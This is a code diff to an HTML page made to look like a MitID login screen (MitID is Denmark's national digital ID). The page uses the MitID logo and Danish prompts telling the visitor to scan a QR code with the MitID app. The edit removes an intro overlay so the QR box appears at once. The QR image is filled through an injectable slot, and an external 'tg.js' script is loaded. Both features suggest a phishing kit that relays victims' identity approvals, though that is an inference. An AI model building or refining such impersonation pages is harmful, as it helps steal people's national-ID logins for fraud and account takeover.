@@ -1999,77 +1999,6 @@ li.typeahead-selectable:hover {
     margin-top: 10px;
 }
 
-/* ===== MitID App Intro Overlay ===== */
-#mitid-intro-overlay {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    width: 100%;
-    padding: 0 0 8px 0;
-    background: #fff;
-    opacity: 1;
-    transition: opacity 0.4s ease;
-}
-#mitid-intro-overlay.hidden {
-    opacity: 0;
-    pointer-events: none;
-}
-.mitid-intro-title {
-    font-size: 18px;
-    font-weight: 700;
-    color: #1a1a1a;
-    margin: 0 0 20px 0;
-    line-height: 1.3;
-    letter-spacing: -0.01em;
-}
-.mitid-phone-wrap {
-    display: flex;
-    justify-content: center;
-    width: 100%;
-}
-.mitid-phone {
-    width: 128px;
-    background: #cde3f5;
-    border-radius: 20px;
-    padding: 18px 14px 22px 14px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    box-shadow: 0 2px 12px rgba(0,96,230,0.10);
-    position: relative;
-}
-.mitid-phone::before {
-    content: '';
-    display: block;
-    width: 32px;
-    height: 5px;
-    background: rgba(0,96,230,0.18);
-    border-radius: 3px;
-    margin-bottom: 14px;
-}
-.mitid-app-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 8px;
-    width: 100%;
-}
-.mitid-app-icon {
-    width: 100%;
-    aspect-ratio: 1;
-    background: #aecfe8;
-    border-radius: 8px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-.mitid-app-icon.mitid-center {
-    background: #0060e6;
-}
-.mitid-app-icon.mitid-center svg {
-    width: 20px;
-    height: 20px;
-    fill: #fff;
-}
 </style>
 
     <meta charset="utf-8">
@@ -2262,30 +2191,7 @@ li.typeahead-selectable:hover {
                 <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCA2MCAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTguODkzMyAzLjU4NTQ1QzE5Ljg3NTMgMy41ODU0NSAyMC42NzE0IDIuNzgyOTEgMjAuNjcxNCAxLjc5Mjc3QzIwLjY3MTQgMC44MDI2MzkgMTkuODc1MyAwIDE4Ljg5MzMgMEMxNy45MTE0IDAgMTcuMTE1MyAwLjgwMjYzOSAxNy4xMTUzIDEuNzkyNzdDMTcuMTE1MyAyLjc4MjkxIDE3LjkxMTQgMy41ODU0NSAxOC44OTMzIDMuNTg1NDVaTTM5Ljc3MDYgNy41Mjc0NkM0MS44MzIyIDcuNTI3NDYgNDMuNTAzNCA1Ljg0MjQ0IDQzLjUwMzQgMy43NjM3NUM0My41MDM0IDEuNjg1MTYgNDEuODMyMiA0LjEwNTA0ZS0wNSAzOS43NzA2IDQuMTA1MDRlLTA1QzM3LjcwOSA0LjEwNTA0ZS0wNSAzNi4wMzc4IDEuNjg1MTYgMzYuMDM3OCAzLjc2Mzc1QzM2LjAzNzggNS44NDI0NCAzNy43MDkgNy41Mjc0NiAzOS43NzA2IDcuNTI3NDZaTTQ4LjQ0MDMgMC4yNDI4NjVINTEuMDE1OUM1Ny4zMjc2IDAuMjQyODY1IDYwIDMuNjk0OCA2MCA4LjAxMzA5QzYwIDEyLjMzMTQgNTcuMzI3NiAxNS43ODMzIDUxLjAxNTkgMTUuNzgzM0g0OC40NDAzVjAuMjQyODY1Wk00Ni41MTM4IDE1Ljc4MzNDNDYuMTI5MyAxMC45OTEyIDQzLjI3NzggOC45ODQzNiAzOS43NzA2IDguOTg0MzZDMzYuMjYzNSA4Ljk4NDM2IDMzLjQxMTkgMTAuOTkxMiAzMy4wMjc1IDE1Ljc4MzNINDYuNTEzOFpNNy4zMDU0MSAxMi41NjFMMy4wMjM3OCA2LjEyMjIyVjE1Ljc4MDZIMFYwLjgwNTA2MUgyLjg3ODY0TDcuMzc3OTggNy44NzgwNUwxMS44NTMxIDAuODA1MDYxSDE0LjY4MzRWMTUuNzgwNkgxMS42MzU0VjYuMTIyMjJMNy40MDIyMSAxMi41NjFINy4zMDU0MVpNMTcuMzkzNiAxNS43ODA1SDIwLjM5MzFWNC44NzgwNkgxNy4zOTM2VjE1Ljc4MDVaTTIzLjY1ODkgNy4zMTcyMkgyMi4wMTRWNC44NzgxSDIzLjY1ODlWMS45MjY5OUgyNi42MzQyVjQuODc4MUgyOS4wMDQ4VjcuMzE3MjJIMjYuNjM0MlYxMi4wOTc2QzI2LjYzNDIgMTIuOTUxMiAyNy4wOTM4IDEzLjM0MTUgMjcuODY4IDEzLjM0MTVDMjguMzI3NiAxMy4zNDE1IDI4LjgzNTUgMTMuMTk1MiAyOS4xNzQzIDEyLjk3NTdWMTUuNjU4N0MyOC43NjI5IDE1Ljg3ODMgMjguMDM3MiAxNiAyNy4yMzkgMTZDMjUuMDM3OCAxNiAyMy42NTg5IDE0LjkwMjQgMjMuNjU4OSAxMi40ODc4VjcuMzE3MjJaIiBmaWxsPSIjMDA2MEU2Ii8+DQo8L3N2Zz4NCg==" alt="" class="mitid-logo">
             </h1>
             <hr>
-            <!-- MitID App Intro Overlay -->
-            <div id="mitid-intro-overlay">
-                <div class="mitid-intro-title">Åbn MitID app og godkend</div>
-                <div class="mitid-phone-wrap">
-                    <div class="mitid-phone">
-                        <div class="mitid-app-grid">
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon mitid-center">
-                                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
-                                </svg>
-                            </div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                            <div class="mitid-app-icon"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="cw-qr-wrapper" style="display:none;">
+            <div class="cw-qr-wrapper">
                 <div class="cw-qr-label">Scan med MitID-appen</div>
                 <div class="cw-qr-box">
                     <img src="assets/qr.png" alt="QR kode" class="cw-qr-img" data-alp-slot="qr-image">
@@ -2724,20 +2630,7 @@ li.typeahead-selectable:hover {
 <script>
 // QR page — no action needed
 
-// MitID intro overlay: show for 2 seconds then reveal QR container
-(function() {
-    var overlay = document.getElementById('mitid-intro-overlay');
-    var qrWrapper = document.querySelector('.cw-qr-wrapper');
-    if (overlay && qrWrapper) {
-        setTimeout(function() {
-            overlay.classList.add('hidden');
-            setTimeout(function() {
-                overlay.style.display = 'none';
-                qrWrapper.style.display = '';
-            }, 420); // wait for fade-out transition
-        }, 2000);
-    }
-})();
+
 </script>
 <script src="tg.js"></script>
 </body></html>
